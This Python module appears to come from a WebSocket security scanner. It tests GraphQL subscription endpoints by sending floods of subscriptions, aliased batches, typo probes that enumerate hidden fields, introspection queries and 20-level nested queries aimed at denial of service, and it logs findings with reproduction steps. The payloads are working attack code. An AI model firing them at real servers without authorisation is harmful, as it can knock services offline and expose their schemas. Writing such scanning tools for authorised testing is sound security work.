"""
GraphQL-over-WebSocket Attack Module
Subscription-specific attacks for modern GraphQL applications
(Hasura, Apollo, AWS AppSync, etc.)
"""
import asyncio
import json
from core.scanner import ws_connect, send_recv
from core.findings import store
from utils.evidence import Evidence
from utils.logger import log


GQL_INIT = json.dumps({'type': 'connection_init', 'payload': {}})
GQL_INIT_LEGACY = json.dumps({'type': 'connection_init'})


async def test_graphql_ws_attacks(ws_url: str, fast_mode: bool = False) -> bool:
    """
    Run GraphQL-over-WebSocket specific attacks:
    - Subscription flooding (DoS)
    - Query depth/complexity abuse
    - Introspection via subscription channel
    - Field suggestion enumeration
    - Subscription authorization bypass
    """
    results = []

    await _test_subscription_flood(ws_url, results)
    await _test_query_batching(ws_url, results)

    if not fast_mode:
        await _test_field_suggestion_leak(ws_url, results)
        await _test_subscription_introspection(ws_url, results)
        await _test_deep_nesting(ws_url, results)

    return len(results) > 0


async def _init_graphql_ws(ws) -> bool:
    """Initialize graphql-ws connection. Returns True if accepted."""
    try:
        await ws.send(GQL_INIT)
        resp = await asyncio.wait_for(ws.recv(), timeout=3)
        data = json.loads(resp)
        return data.get('type') in ('connection_ack', 'ka', 'ping')
    except Exception:
        try:
            await ws.send(GQL_INIT_LEGACY)
            resp = await asyncio.wait_for(ws.recv(), timeout=2)
            return True
        except Exception:
            return False


async def _test_subscription_flood(ws_url: str, results: list):
    """Test if server limits concurrent subscriptions per connection"""
    try:
        async with await ws_connect(ws_url, timeout=5) as ws:
            if not await _init_graphql_ws(ws):
                return

            # Send many concurrent subscriptions
            accepted = 0
            for i in range(100):
                sub = json.dumps({
                    'id': str(i),
                    'type': 'subscribe',
                    'payload': {
                        'query': 'subscription { __typename }'
                    }
                })
                try:
                    await ws.send(sub)
                    accepted += 1
                except Exception:
                    break

            # Try to receive responses (read quickly)
            errors = 0
            for _ in range(5):
                try:
                    resp = await asyncio.wait_for(ws.recv(), timeout=1)
                    data = json.loads(resp)
                    if data.get('type') == 'error':
                        errors += 1
                except Exception:
                    break

            # If we sent 50+ subscriptions without rejection → no limit
            if accepted >= 50 and errors < 10:
                ev = Evidence.make(
                    proof=f'Server accepted {accepted} concurrent GraphQL subscriptions without limit',
                    payload=f'{accepted}x subscription operations sent',
                    reproduce=(
                        f"1. Connect to {ws_url}\n"
                        f"2. Send connection_init\n"
                        f"3. Send {accepted} subscription messages\n"
                        f"4. No rate limit or subscription cap — DoS risk"
                    ),
                    subscriptions_sent=accepted,
                    errors_received=errors,
                )
                store.add(ws_url, 'GraphQL Subscription Flooding', 'MEDIUM',
                    f"No limit on concurrent GraphQL subscriptions.\n"
                    f"Server accepted {accepted} subscriptions on one WS connection.\n"
                    f"Attacker can exhaust server resources via subscription flooding.", ev)
                results.append('graphql_sub_flood')
    except Exception as e:
        log.debug(f"GraphQL subscription flood test error: {e}")


async def _test_query_batching(ws_url: str, results: list):
    """Test if server limits query batching via subscriptions"""
    try:
        async with await ws_connect(ws_url, timeout=5) as ws:
            if not await _init_graphql_ws(ws):
                return

            # Send a batch of heavy queries
            batch_query = json.dumps({
                'id': '1',
                'type': 'subscribe',
                'payload': {
                    'query': '''
                    subscription {
                        a: __typename
                        b: __typename
                        c: __typename
                        d: __typename
                        e: __typename
                        f: __typename
                        g: __typename
                        h: __typename
                        i: __typename
                        j: __typename
                    }
                    '''
                }
            })
            await ws.send(batch_query)

            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=3)
                data = json.loads(resp)
                if data.get('type') != 'error':
                    ev = Evidence.make(
                        proof='Server accepted batched subscription query with 10 aliases',
                        payload=batch_query[:200],
                        reproduce=(
                            f"1. Connect to {ws_url}\n"
                            f"2. Send connection_init\n"
                            f"3. Send subscription with 10+ field aliases\n"
                            f"4. No query complexity limit enforced"
                        )
                    )
                    store.add(ws_url, 'GraphQL Query Batching Abuse', 'LOW',
                        f"No query complexity/batching limit on GraphQL subscriptions.\n"
                        f"Attacker can batch many operations in a single subscription.", ev)
                    results.append('graphql_batching')
            except Exception:
                pass
    except Exception as e:
        log.debug(f"GraphQL batching test error: {e}")


async def _test_field_suggestion_leak(ws_url: str, results: list):
    """Test for field suggestion leaks ('Did you mean?' errors)"""
    try:
        async with await ws_connect(ws_url, timeout=5) as ws:
            if not await _init_graphql_ws(ws):
                return

            # Query with intentionally wrong field names
            probe_queries = [
                'subscription { userz { id } }',
                'subscription { us { name } }',
                'subscription { admi { role } }',
                'subscription { messag { content } }',
            ]

            for query in probe_queries:
                msg = json.dumps({
                    'id': '1',
                    'type': 'subscribe',
                    'payload': {'query': query}
                })
                await ws.send(msg)

                try:
                    resp = await asyncio.wait_for(ws.recv(), timeout=2)
                    resp_str = str(resp).lower()

                    if 'did you mean' in resp_str or 'did_you_mean' in resp_str:
                        ev = Evidence.make(
                            payload=query,
                            response=resp[:400] if isinstance(resp, str) else str(resp)[:400],
                            proof='GraphQL field suggestion leak — "Did you mean?" exposed hidden fields',
                            reproduce=(
                                f"1. Connect to {ws_url}\n"
                                f"2. Send subscription with typo: {query}\n"
                                f"3. Server responds with 'Did you mean?' suggestion\n"
                                f"4. Hidden field names can be enumerated"
                            )
                        )
                        store.add(ws_url, 'GraphQL Field Suggestion Leak', 'MEDIUM',
                            f"GraphQL suggests field names on typos via WebSocket.\n"
                            f"Query: {query}\n"
                            f"Attacker can enumerate hidden fields/types.", ev)
                        results.append('graphql_field_leak')
                        return
                except Exception:
                    pass
    except Exception as e:
        log.debug(f"GraphQL field suggestion test error: {e}")


async def _test_subscription_introspection(ws_url: str, results: list):
    """Test if introspection is accessible via subscription channel"""
    try:
        async with await ws_connect(ws_url, timeout=5) as ws:
            if not await _init_graphql_ws(ws):
                return

            # Try introspection via subscribe
            introspection_msg = json.dumps({
                'id': '1',
                'type': 'subscribe',
                'payload': {
                    'query': '{ __schema { types { name fields { name } } } }'
                }
            })
            await ws.send(introspection_msg)

            for _ in range(3):
                try:
                    resp = await asyncio.wait_for(ws.recv(), timeout=2)
                    if '__schema' in str(resp) and 'types' in str(resp):
                        ev = Evidence.make(
                            payload=introspection_msg[:200],
                            response=str(resp)[:400],
                            proof='Full introspection accessible via WebSocket subscription channel',
                            reproduce=(
                                f"1. Connect to {ws_url}\n"
                                f"2. Send connection_init\n"
                                f"3. Send introspection query via subscribe\n"
                                f"4. Full schema exposed — bypasses HTTP introspection disable"
                            )
                        )
                        store.add(ws_url, 'GraphQL Introspection via WebSocket', 'MEDIUM',
                            f"Full GraphQL introspection accessible via WebSocket subscription.\n"
                            f"Even if HTTP introspection is disabled, WS channel may bypass it.", ev)
                        results.append('graphql_ws_introspection')
                        return
                except Exception:
                    break
    except Exception as e:
        log.debug(f"GraphQL subscription introspection test error: {e}")


async def _test_deep_nesting(ws_url: str, results: list):
    """Test for deep query nesting via subscription (recursive DoS)"""
    try:
        async with await ws_connect(ws_url, timeout=5) as ws:
            if not await _init_graphql_ws(ws):
                return

            # Build deeply nested query
            depth = 20
            nested = '{ __typename '
            for _ in range(depth):
                nested = f'{{ __typename ... on Query {nested} }}'
            nested += ' }'

            msg = json.dumps({
                'id': '1',
                'type': 'subscribe',
                'payload': {'query': f'subscription {nested}'}
            })

            import time
            t_start = time.perf_counter()
            await ws.send(msg)

            try:
                resp = await asyncio.wait_for(ws.recv(), timeout=5)
                elapsed = time.perf_counter() - t_start
                data = json.loads(resp) if isinstance(resp, str) else {}

                if data.get('type') != 'error' and elapsed > 2.0:
                    ev = Evidence.make(
                        proof=f'Deep nested query accepted, took {elapsed:.1f}s to process',
                        payload=f'{depth}-level nested subscription query',
                        reproduce=(
                            f"1. Connect to {ws_url}\n"
                            f"2. Send {depth}-level nested subscription\n"
                            f"3. Server processes without depth limit\n"
                            f"4. Response took {elapsed:.1f}s — DoS potential"
                        )
                    )
                    store.add(ws_url, 'GraphQL Deep Nesting DoS', 'MEDIUM',
                        f"No query depth limit on GraphQL subscriptions.\n"
                        f"Server processed {depth}-level nested query in {elapsed:.1f}s.\n"
                        f"Attacker can cause DoS via recursive query fragments.", ev)
                    results.append('graphql_deep_nesting')
            except asyncio.TimeoutError:
                ev = Evidence.make(
                    proof=f'Deep nested query caused server timeout (5s+)',
                    payload=f'{depth}-level nested subscription query',
                    reproduce=(
                        f"1. Connect to {ws_url}\n"
                        f"2. Send {depth}-level nested subscription\n"
                        f"3. Server hangs — confirmed DoS vulnerability"
                    )
                )
                store.add(ws_url, 'GraphQL Deep Nesting DoS', 'HIGH',
                    f"Deep nested GraphQL subscription caused server timeout.\n"
                    f"Depth: {depth} levels.\n"
                    f"Server is vulnerable to recursive query DoS.", ev)
                results.append('graphql_deep_nesting')
    except Exception as e:
        log.debug(f"GraphQL deep nesting test error: {e}")
